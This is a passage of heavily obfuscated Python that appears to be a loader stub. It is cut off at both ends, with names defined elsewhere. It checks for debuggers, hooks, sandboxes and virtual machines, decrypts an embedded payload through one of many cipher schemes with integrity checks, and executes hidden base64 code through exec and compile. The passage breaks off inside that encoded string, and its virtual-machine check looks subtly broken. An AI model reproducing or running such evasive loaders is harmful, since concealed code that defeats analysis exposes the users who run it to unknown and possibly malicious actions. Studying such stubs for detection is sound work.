    _iczuqq = bytes.fromhex("051f097f18072619220f1a75242e1b7434187c7c1b372b1f1d1f1e342e382b0019143e031920201a157834077b3d3f7e1f2f0e29392f283a01230214060e043f191d39782a017e2205027b24220e0b2b1b0a2e21252801150e7e3c7c0802012821370c1b2c3c072901211875350303190a051518041a0f003a3c0a0122152f070f0f260079091b1c221d1e7f0a1c23390c3f353a0e0b253f3a3e2308250e290717291f192103743e090a3c3b2b080a1e79080f097a0a23010f2f022f2c7a39063c7e7a067d0c031e7e0c75222b751c793437140b1c02070e0839140a1b0819062c3e212f0f1a262a053d1f032004057f2c7501392f3b3d29797f1b020f2f060c3e2b141d372b741838260b7f2a2828397f15010b0e1b392f780c750529193e1f7f2b7f02180e150c7f34047c19220735170f07151e0135151808080608203f082b257b142c7f2778293e1c3a347504033a7a0e212b191b7817793a7e0b0701190b3a25080923293b1d3c1c780b741a3f3c7a1a0e203e1b0619051d2724221d7919387b0024231b2b201a2b260f2b26040b757f1c1f25342a3538097b7d21093e0a0b070a092e74181e3a35192b2e002f380e091b06343a2e26043f14211a0a0f1b740f042a23347b3f010a1908217f081d3a357d18287a053a06750b211a062f2b2e0c203b3b3479003f7b350f253b2505197d2537031c263817002517277875380e3d38041f26021e01757d060e200b140a7e3d012a34377a0c7e06207f22293a7d0c7f063c070a261b1b00052b060e3b180b7c027e357d221907790f007478003f75040500153c04023d0f2a1d0a01241709220b062e22213e7d221d1d7c3c2c7b7c393f0826273f061e0814240820197e1c7c250f26783b2e147c081502040b2f2805222e0639243a3d2f2b3c0234141e2017351a0b0e0b152e1d292806397d1c3d292203287f1d00202f0e3f7c7f1f142e183502001f010f032c0e3b0b75237c052b0b797d1721793703141a073a7405781d39050f7809752f7b011e3c3c1b357c233e7f3e17227a0a2f0b247b79792f2101340c080c247f0e073e3a15150b291b0b3b0426010a14793879140375222c387f7c383b221d281d1a08093d3f381d27380b26352e0c7a3b2c79142e383b1d143d78211725250b0021780a24277d2a067906280b0801243e247f1c241b270a7c211e1e780b29392608157b25233e240f0f1b08087d1e172f0a243d21217514250b0802027d0e241e7b391a15202c17753e38060906000e221e2308012b1f782a757c0f747a0927291e07257d00227c1b17097d181c177c07251b7e1d753f0e251434797809042b1e0f343c197a271a061f7925047a1b0f787a1b7a1d7908011d7d0920260e081a7c7d283f7e3c377c7f27030c0e3d217c3a7e7f053f0f782e2c287c383a3a7f7c3e261400271e")
    _iczuqq = bytes(_ ^ 77 for _ in _iczuqq).decode()
    _yaznywca.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _yaznywca.modules:
            _yaznywca.stderr.write('error: debugger detected\n'); _yaznywca.exit(1)
    _oixqnzcx = _qzhvynqq.b64decode(_migejpbhf)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_yaznywca.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _yaznywca.stderr.write('error: hook detected\n'); _yaznywca.exit(1)
    if len(_yaznywca.meta_path) > 5:
        _yaznywca.stderr.write('error: import hook detected\n'); _yaznywca.exit(1)
    if getattr(_yaznywca, 'flags', None) and _yaznywca.flags.no_user_site:
        _yaznywca.stderr.write('error: sandbox detected\n'); _yaznywca.exit(1)
    import os
    if any(x in str(_yaznywca.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _yaznywca.stderr.write('error: virtual machine detected\n'); _yaznywca.exit(1)
    if _zjsbjgb == 12:
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=64)
        _mgqsyn = _bafpb[:32]; _arnlrkhgn = _bafpb[32:64]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _gvxrmjzv = 3 + (_mzrxfsepw[0] & 7)
        _mzrxfsepw = bytearray(_jnvsdgr)
        for _utlwd in range(_gvxrmjzv - 1, -1, -1):
            _epokibzgo = (3 + _utlwd) & 7
            _jdqemary = (_utlwd * 0x1B + 0x5A) & 0xFF
            for _hcucfatbx in range(len(_mzrxfsepw)):
                _gvxrmjzv = _mzrxfsepw[_hcucfatbx]
                _gvxrmjzv ^= _jdqemary
                _gvxrmjzv = ((_gvxrmjzv >> _epokibzgo) | ((_gvxrmjzv << (8 - _epokibzgo)) & 0xFF))
                _gvxrmjzv ^= _mgqsyn[(_utlwd * len(_mzrxfsepw) + _hcucfatbx) % len(_mgqsyn)]
                _mzrxfsepw[_hcucfatbx] = _gvxrmjzv
        _dbcgxed = bytes(_mzrxfsepw)
    elif _zjsbjgb == 13:
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=80)
        _mgqsyn = _bafpb[:32]; _hcucfatbx = _bafpb[32:48]; _arnlrkhgn = _bafpb[48:80]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        import struct as _ydevgq
        def _epokibzgo(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_ydevgq.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_ydevgq.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_ydevgq.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _utlwd = _ydevgq.unpack('<I',_hcucfatbx[:4])[0]
        _hcucfatbx = _hcucfatbx[4:]
        _mzrxfsepw = bytearray()
        while len(_mzrxfsepw) < len(_jnvsdgr):
            _gvxrmjzv = _epokibzgo(_mgqsyn, _utlwd, _hcucfatbx)
            for _jdqemary in range(min(64, len(_jnvsdgr) - len(_mzrxfsepw))):
                _mzrxfsepw.append(_jnvsdgr[len(_mzrxfsepw)] ^ _gvxrmjzv[_jdqemary])
            _utlwd += 1
        _dbcgxed = bytes(_mzrxfsepw)
    elif _zjsbjgb == 5:
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=64)
        _mgqsyn = _bafpb[:32]; _arnlrkhgn = _bafpb[32:64]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _dbcgxed = bytes(_jnvsdgr[i] ^ _mgqsyn[i % 32] for i in range(len(_jnvsdgr)))
    elif _zjsbjgb == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _cirlkmol, algorithms as _uksauavt, modes as _jetgcercc
        except ImportError:
            _yaznywca.stderr.write("error: cryptography not installed\n"); _yaznywca.exit(1)
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=80)
        _mgqsyn = _bafpb[:32]; _hcucfatbx = _bafpb[32:48]; _arnlrkhgn = _bafpb[48:80]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _cksrhz = _cirlkmol(_uksauavt.AES(_mgqsyn), _jetgcercc.CTR(_hcucfatbx))
        _dbcgxed = _cksrhz.decryptor().update(_jnvsdgr)
    elif _zjsbjgb == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _cirlkmol, algorithms as _uksauavt, modes as _jetgcercc
        except ImportError:
            _yaznywca.stderr.write("error: cryptography not installed\n"); _yaznywca.exit(1)
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=80)
        _mgqsyn = _bafpb[:32]; _hcucfatbx = _bafpb[32:48]; _arnlrkhgn = _bafpb[48:80]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _cksrhz = _cirlkmol(_uksauavt.AES(_mgqsyn), _jetgcercc.CBC(_hcucfatbx))
        _dbcgxed = _cksrhz.decryptor()
        _dbcgxed = _dbcgxed.update(_jnvsdgr) + _dbcgxed.finalize()
        _gvxrmjzv = _dbcgxed[-1]
        if _gvxrmjzv < 1 or _gvxrmjzv > 16 or not all(_ == _gvxrmjzv for _ in _dbcgxed[-_gvxrmjzv:]):
            _yaznywca.stderr.write("error: decryption failed\n"); _yaznywca.exit(1)
        _dbcgxed = _dbcgxed[:-_gvxrmjzv]
    elif _zjsbjgb == 9:
        def _jwqezroh(_ztdsnmi):
            if _ztdsnmi[:2] == b'<~': _ztdsnmi = _ztdsnmi[2:]
            if _ztdsnmi[-2:] == b'~>': _ztdsnmi = _ztdsnmi[:-2]
            _xiczhqb = bytearray(); _pmcylvhin = 0
            while _pmcylvhin < len(_ztdsnmi):
                if _ztdsnmi[_pmcylvhin] == 122:
                    _xiczhqb.extend(b'\x00\x00\x00\x00'); _pmcylvhin += 1; continue
                _jfcsxd = 0; _awzoerlov = 0
                while _pmcylvhin < len(_ztdsnmi) and _awzoerlov < 5:
                    _jfcsxd = _jfcsxd * 85 + (_ztdsnmi[_pmcylvhin] - 33); _pmcylvhin += 1; _awzoerlov += 1
                _xnoff = _awzoerlov - 1
                if _xnoff > 0: _xiczhqb.extend(_jfcsxd.to_bytes(4, 'big')[4-_xnoff:])
            return bytes(_xiczhqb)
        _dbcgxed = _jwqezroh(_oixqnzcx)
    elif _zjsbjgb == 6:
        _dbcgxed = _qzhvynqq.b64decode(_oixqnzcx)
    elif _zjsbjgb == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _cirlkmol, algorithms as _uksauavt, modes as _jetgcercc
        except ImportError:
            _yaznywca.stderr.write("error: cryptography not installed\n"); _yaznywca.exit(1)
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=64)
        _mgqsyn = _bafpb[:32]; _arnlrkhgn = _bafpb[32:64]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _cksrhz = _cirlkmol(_uksauavt.AES(_mgqsyn), _jetgcercc.ECB())
        _dbcgxed = _cksrhz.decryptor()
        _dbcgxed = _dbcgxed.update(_jnvsdgr) + _dbcgxed.finalize()
        _gvxrmjzv = _dbcgxed[-1]
        if _gvxrmjzv < 1 or _gvxrmjzv > 16 or not all(_ == _gvxrmjzv for _ in _dbcgxed[-_gvxrmjzv:]):
            _yaznywca.stderr.write("error: decryption failed\n"); _yaznywca.exit(1)
        _dbcgxed = _dbcgxed[:-_gvxrmjzv]
    elif _zjsbjgb == 10:
        _dbcgxed = bytes.fromhex(_oixqnzcx.decode('ascii'))
    elif _zjsbjgb == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _liawwqq
        except ImportError:
            _yaznywca.stderr.write("error: cryptography not installed\n"); _yaznywca.exit(1)
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _dbcgxed = _oixqnzcx[16:-32]
        _jnvsdgr = _dbcgxed[:-16]; _gvxrmjzv = _dbcgxed[-16:]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=76)
        _mgqsyn = _bafpb[:32]; _hcucfatbx = _bafpb[32:44]; _arnlrkhgn = _bafpb[44:76]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _dbcgxed, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _dbcgxed = _liawwqq(_mgqsyn).decrypt(_hcucfatbx, _jnvsdgr + _gvxrmjzv, None)
    elif _zjsbjgb == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _cirlkmol, algorithms as _uksauavt, modes as _jetgcercc
        except ImportError:
            _yaznywca.stderr.write("error: cryptography not installed\n"); _yaznywca.exit(1)
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=80)
        _mgqsyn = _bafpb[:32]; _hcucfatbx = _bafpb[32:48]; _arnlrkhgn = _bafpb[48:80]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _cksrhz = _cirlkmol(_uksauavt.ChaCha20(_mgqsyn, _hcucfatbx), mode=None)
        _dbcgxed = _cksrhz.decryptor().update(_jnvsdgr)
    elif _zjsbjgb == 8:
        _hnqvz = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _sjzsf = {c:i for i,c in enumerate(_hnqvz)}
        def _pavyeofg(_wkzlesw):
            _xcjlshm = bytearray(); _bxxvd = 0
            while _bxxvd < len(_wkzlesw):
                _kfwkknr = 0; _jpfiajc = 0
                while _bxxvd < len(_wkzlesw) and _jpfiajc < 5:
                    _kfwkknr = _kfwkknr * 85 + _sjzsf[chr(_wkzlesw[_bxxvd])]; _bxxvd += 1; _jpfiajc += 1
                _oaaxlsgx = _jpfiajc - 1
                if _oaaxlsgx > 0: _xcjlshm.extend(_kfwkknr.to_bytes(4, 'big')[4-_oaaxlsgx:])
            return bytes(_xcjlshm)
        _dbcgxed = _pavyeofg(_oixqnzcx)
    elif _zjsbjgb == 11:
        _mzrxfsepw = _oixqnzcx[:16]; _vryszjaww = _oixqnzcx[-32:]; _jnvsdgr = _oixqnzcx[16:-32]
        _bafpb = _auhmzd.pbkdf2_hmac('sha256', _iczuqq.encode(), _mzrxfsepw, 100000, dklen=64)
        _mgqsyn = _bafpb[:32]; _arnlrkhgn = _bafpb[32:64]
        _ncllq = _yzckkmf.new(_arnlrkhgn, _jnvsdgr, digestmod='sha256').digest()
        if not _yzckkmf.compare_digest(_vryszjaww, _ncllq):
            _yaznywca.stderr.write("error: integrity check failed\n"); _yaznywca.exit(1)
        _gvxrmjzv = _mgqsyn[0]
        _dbcgxed = bytearray()
        for _utlwd in range(len(_jnvsdgr)):
            _mzrxfsepw = _jnvsdgr[_utlwd] ^ _gvxrmjzv
            _dbcgxed.append(_mzrxfsepw)
            _gvxrmjzv = _jnvsdgr[_utlwd] ^ _mgqsyn[ (_utlwd + 1) % len(_mgqsyn) ]
            _gvxrmjzv = (((_gvxrmjzv << 3) & 0xFF) | (_gvxrmjzv >> 5)) ^ 0x5A
        _dbcgxed = bytes(_dbcgxed)
    elif _zjsbjgb == 7:
        _dbcgxed = _qzhvynqq.b32decode(_oixqnzcx)
    else:
        _yaznywca.stderr.write("error: unsupported algorithm\n"); _yaznywca.exit(1)
    _vk = bytes.fromhex("89db45e58191c06a531e6693d4b197b03ea9acf2bf31f64db7d277e17e9070b3")
    _vn = bytes.fromhex("6148fe25fff543b0707295352fd28e9d")
    _sig = _dbcgxed[-32:]
    _pl = _dbcgxed[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _yaznywca.stderr.write('error: VM integrity check failed\n'); _yaznywca.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _dbcgxed[1] == 1:
        import zlib as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 2:
        import lzma as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 3:
        import bz2 as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 4:
        import brotli as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 5:
        import zstandard as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 6:
        import gzip as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 7:
        import lz4.frame as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 8:
        import snappy as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 9:
        import gzip as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    elif _dbcgxed[1] == 10:
        import blosc as _jmrpysoac
        _pd = _jmrpysoac.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_qzhvynqq.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdkdlR5c0JKZGpPTHFsOHFJVWFuak1OMllmNGVNSnJYeXZmcG5LQWY5SUFrPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgncGRSWmZDNzFSRVhIZklUMkZ1eXV6TjBJZHF6VEIvZHgwSzFScXlvU0lQd0xhcTg3WC83Qys1L1NialhHdU9YcjBHeE5IbzJnTmRuWXhSeFFESGtxTzVncU1jRE02a2pmTjZnWDFOVXhzc0VicjEzZUNPdUZxbFQ0eEc1S1gwUW42YTJEL3ArWWoreXVvbVpoSFBXc2R2cUtBc21yZmx1aTNzVkxrR0JzSWUvL0hYZ3hxYmxvYklOdWdvREI0N0JGWGJmTjlvaDh5YmRxQW5nb2h3K3VtWHpBbFJHK3Q5Nm5iQU5VQTBNSyt2QndnNUphU2hpckczYTRkYy9wNVBzRXliMVh1SUp1QzZqNWJvOUh2K1hEWVpvWkx4R2lRS2IzVnFYV2JKNjhBWmNzY2Zmdy82WEsvc3c9JyksIGJhc2U2NC5iNjRkZWNvZGUoJ2VES2JKVDFIbGMyNmpSYzRwRnhkWWNUUGVUMEhlSG1OdG5FaDJzUWVGMVhPNEtNdlJjTGFaSDhWR1RpUkdhRzRPWG8vR0doN3hCc2dERTlseXRhbFFqRkEva0syUWNzWU44YjQ2c3NWVnJxdHU5MDFXYjRzSndPOCszMTRUcEJLSFVmVWFsV0doSzBzMWtsbUJWVjFUS0tjNmUzTEtENjVaK1Ara1RhSE1MWUlwVzVXT0k0SERLNTVacHlMbUFQUFltdTFJM1d2a1c1ZHRhb3QzdUloK21yVGYzcEk5UmEzTURuaVcwVzR0MFRMaW5OZFNsYWt5N1hOUEhUYzIwdEVrKzlrYmFvalNMUTF0dyt0c0R1dkYyZDFPaVIxaFRHb0FHQkIrVlNrdmd0SicpLCBiYXNlNjQuYjY0ZGVjb2RlKCdodDBlcjNjYWR0SnNHblVhUnVsRndXM0JGK2hJUnM1dUxUYlMyVERyN3dHTEZWL3lUYXI4RnFURFp3ZWFtcEJMYlg4ZEF3ZXVYKzVITGp6NU9mSTFzRDFrQWxuMkl3UEJoRDJGaXZEMGVNRmNZdHRGMFJIZm5xSGozUnNuMUNPNWRacmM0T2JBaVc5Mnk2aUd0SXFvS2lzTHdFZEIvSHBvN1FObzdONStNbTRkUjVqaXZ0aWxwVzl1eHBWRm5Hd25vNEsrd0NFTytJRDg2cVV1SC9DaEFOQmJqK2VtUDFBbXJLNG0zUmVLVCtGREhkUVFqdkkvYlN5cWlpekJreEk2SXBsdjNMbjY0b0JIdXY3OXpuRHZjWnptSFVUcEVkbzdMaHFoVEJBb1lWcDNDVlAwdzloRGlJSGwnKSwgYmFzZTY0LmI2NGRlY29kZSgnbGd1RGI4UWVycCtQYWc1MXM5aXcvZ1BBeWRjdGlMYnM0T3pFdzFFM3hWeXVPYVY0dUVnWmdqUDRYeG5oNGVxZko4cit5YldBWkEvWEpNTUxpcitldU9rS2NFZTVuWGJuWEk5aTJqOTB2WEJZSFNITHJ6b0lHV3pVU3ZWV3FOUHhlYThkU2tQdU9jME1KNnJPVDgyTlo5OEM2N0pRbjFIek45QTV6L05wb0g1czlhclF1bU4vWi9FVnlSOVFxNHRFdkVzS2tUZzRFenVoTGRIZFNwcklVdytBNmdOd2hBbU9oTXpFYXhSVHVtRmNkZllybDRnOGcvOHgxWVVPU0lGTUtqeE9YYnNBZXZBa245N2lFemd6LzVrNlR4L1QzdGxFSGJoN0p0TFBrRG5IQ1lYRThNajRKSjE2S3ltSDZyUUE3S2VUWEJIRVNlR01WM2x5Y1FkbkVUVlhMOWhKdzg5VHFJL2g4NDdJZGNLZHROWldoNmhOZDIxMyt0RUpMRFJ6Q01SNjk1QnlNRGkvMXhxTC9mcGFFV1paQU1vMFhGVE50SHMyakJTNzVnQlIvL3ZWbmR2THhXbTN5VGxGWGZJbllZUDlJcHFIbHJvVFJzcHgya1pTZjFNNnd5dmw0VGlzNlBnWDRwQ1Z1R1g5S3RweG5uTGErRWtQcStEWW80U0xLTDByYnFMdVA5c25EY2hmaG42MGtrOGV5b2p1N1pxczlHN0VqSEtlQi96WVhlR3JiaUQwdXlURkdkRzJhQVRtN3lueUJ3YU1zUllVc2lrRXY2Ti9tWW5mSi91a215eUI0OTRZNURzWS9hMDZ0YTVmS1VJSzFPWHMwUWwzbVVyZG5zZSt4eHZhZnpnT1FTdE1ud3FkclVaQnplZ09OUWJRQ3NiK0IxL25Wb0cvbERlamd6SGRLUlFLVk1XRnJGSm1ZYng5ZjdwVngzZzhHMThzb0ZyNGNGbjN5bGV4UjZyRG8vUW1tQVJ4Z0tudVlmQXJORnk3UUppWjVkdi9zcTgwcjVvZHpoNmxNdmtEWEUvbFlacUFMWU5RemZZTUdTUkZOdWFMaWdVZDRRbHUzVU1maXBvS3FNaUhHVFIyK1grc29zL3NzZGhXVCs4WFR3MXFSS2xPRmRSOGNRb1A0UGtVa2pWT0pWVnNEUnVNQkFTL3E4VmkvWGVlaG9ET0t4dXpmTWxuWDF1K0tMaEV5VjFqOVRVNUIwVkFlS0huR1NKSE9Rd1dJMWJFa2hxZGZpZDhwNlFsaStJdUJuS3VReFFibHNSYWVtck5qcy9qbE00Z0Jpalpta2d2MWR0VEhUUGxHUWFtSGNvQWpOQ3l2MkJtd3FuUysyZ084L0R4ZmZqREtLSzhsQ0NiTVJzL1VUL0RsMk9LbS9MWW1KS2tIT2NkSUw0QVExTmpmNDB6YmU4TkVzT1lrTXJQSE8vTlhRNXhkSTZKNGw4Y0hsLzNKQ3JFR1BnRThSK0xzMFhTVnlTd3Fxa0dTZGd2WG9CTGg4L29jS1VaRmcwVjFyK3c0OURGbFhHWW5XS2lZclBXeVJUWUNVUXVsOEhrdnVSdkVCZWEwaXU2VkZFODZIQno5WVpWL0xhQUNpSkVWZmdkcFdEbzJybXJQclZQWStiQlVYUENSS3RZM2xVbXFMd3JMZkE2Y0IvVjdBclBUTFJFbk1XeTNSb3doT05GR2xTeUF2V1h1NklOazMrQ1Vkby9wYUJwZERRV0swM2p1UHhnbUJhWWl3R0FlcGU4VnhDb0Z6SFRzMERLTko5TjdELzd2eDh1eHFrL0RLeGFvcnFXWjlyRnlEZzMrcStQSW5zMm44anhjbFprR24rdXFJS0pVK3hPNDFNSGxDeGpZYVpnbVphblVOUnlReE5MWWZEbFpTM2RtQk13aVlOMDFzMXlnUXQ4bzUrSVppTVNJazhReDg0eklRYVkrWkk3Y1Z5cjltbC9taVVlU2ZpMGJKRDQzK2w5UTVNNFhmaEhCRjRpblRyekVmWi9NZjJoUnVaTFVybXU4bW9Gek1xVEpSckZkQzJ4ZmcySTNZb3FTb0VLLzA4VHRBSjRNNW9FMXBDT2JsNnlwQXo2MncwQWo2ZnV4MjZITkk1M1BaSjhDaWNxMmw1anNPSnZZMlcvNDVFYllqY2Z5Q0hIK1hHLzdQc1IvTnlSdjUvdjB1NDg0K1JQeUdlWmcrc1ZEem95dm41VnA1Rkh5TkxFZU1VamNzOGg5b2ZNS2lDejBlSzRiU1U3eHQrOE1hMXVnYmU5eXA1d0pKZzRTY2RtY2dKZmRVQzhMSURLOHQ0SXFybE5QY3d1dVhBVGNHelNlbklNN0wxNDkvQ1NydllnaFIzMTUxdUdsQ1VuS1VSK2t6M1lNdGhxdVNGVUdKZXE1NGpCM3lMSUoxSytsNHc3dHhxSStpQXJzYXBBMEdTazhzVUs3NkxaNmFmWGFGRkJWUUlhQWp2cTREb05Scmo0M21mSVJGeFJ4QVF3QW91YnI1ZFlQTlp1NDNWM0x4OGtFZVFVcm5oN1d6YVNIcHcwVHlOdzdVRWRlaG5UTGpraGtNTTlMNDU3Tlh5dVozaHY3dVFVazF3d1hZbnBlSk5aMGJFWlYxbHVObUFHM0FyVm83YUNxWDAzRmtJeVJ4NVk3Rkppamo0Q2FzZkk1a0tIK1RmNlBrbGNZT1RDTjNyVXRFT3E2aDZwWmNUZ2wxTlg5SmVmQ0hlamhZRTBGMDUvYkd1V09kZGpJQitwbHJLK3pIWGlkZmlqVTZNd3ZiMXNURzdtSmNHTTJSNnBlQmlTVDVnNWVKM09OVU1kOEhTeGJiejFaRUpWRDFiblFOa1JqL2g3VVNvYjQrMGpNN2JOTFFJL0xXemRGdFJGemRCMjlFTDZac2tsSTNJNEp4bmtEYXpGdVUrSVN0RXdKKzNOVVVQczlhY1pRM1BMc296K2tHbG1DbVpsSTNMN3pTU2ZSTEkwZno3dmwvVFhLR0FTNzJ4MUQ5VG9kRmN6TWN4TG5PQ2gxdk95aHFLU2REQUtwMU1RTFQ5S1ZIYjdmOXMyb2pza1ZiM2MxUy9GMWdSQUJkeFNicFhWTUlJWml3VU0vWnNCSVJMYnBZNHJjdHpKUTZvWi82ZTZHcy9HeHNPaEkxVm1XWFV2cFN3QmhOZDcxdVV5VGNIWWljK3hRZjNmajQ0eFYvMVNQWUhUZUoyc25uaXdxUmRQQUhLbTh3QmRJNEhqaW1HbEVockZ4cTVISVYxZnJ0cVhCVlRBREgva3J6cWwwVW5RSVFoRjdSd2VkM0RLZzdNSE9YeDZPTU5KWklkeEFZRWROZzhYV0E2cDJSaTc0MkhNNTlGVUdPdU9TNWwwSzQ0OXdCVGxqTEw0YkRQemRURG9vK2tpZkcvcEdhelJoT212cE1lQm4vcEZLM3hlNDdCZnBOSDdPZGRNMzN5N3dXdHc0NnU4K3B0RUE4Q1FTbmduR2d0SHZxYVk4V1VoSzN1OVVsZHZzZVZQOHBOK0JHaEhKcHdFYlFEaE1pVEY2S3BTR1BLVkxCaHNKY2JUYTZKWFB2OWROelF4bmY1L3NmVk1FSGEwMEpQczNueHZ3RGtCbXlQRm1nWGRhNDd3VjR